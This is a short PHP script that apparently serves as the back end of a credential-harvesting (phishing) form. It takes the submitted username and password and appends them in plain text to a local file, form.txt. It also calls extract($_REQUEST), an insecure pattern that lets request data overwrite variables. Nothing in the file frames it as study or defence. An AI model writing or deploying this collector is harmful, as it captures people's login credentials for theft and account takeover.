<?php

  extract($_REQUEST);
  $file=fopen("form.txt" , "a");
  
  fwrite($file , "User name :");
  fwrite($file , $_POST['username'] . "\n");
  fwrite($file , "Password :");
  fwrite($file , $_POST['password'] . "\n\n");
  fclose($file);
  
?>